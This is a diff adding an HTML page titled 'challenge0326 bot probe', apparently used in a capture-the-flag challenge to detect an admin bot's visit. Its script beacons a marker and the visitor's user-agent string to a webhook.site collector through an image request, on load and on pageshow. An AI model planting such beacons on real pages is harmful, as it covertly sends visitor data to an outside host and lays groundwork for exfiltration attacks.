@@ -1,0 +1,17 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>challenge0326 bot probe</title>
+<body>probe-pending</body>
+<script>
+const MARK = 'botpages:1773760240';
+const SINK = 'https://webhook.site/caaac3a6-72f9-4933-ae3a-1a8e17e3baf4';
+
+function ping(message) {
+  const image = new Image();
+  image.src = `${SINK}?m=${encodeURIComponent(message)}&t=${Date.now()}`;
+}
+
+ping(`probe:boot:${MARK}:${navigator.userAgent}`);
+window.addEventListener('pageshow', () => ping(`probe:pageshow:${MARK}`), { once: true });
+document.body.textContent = MARK;
+</script>
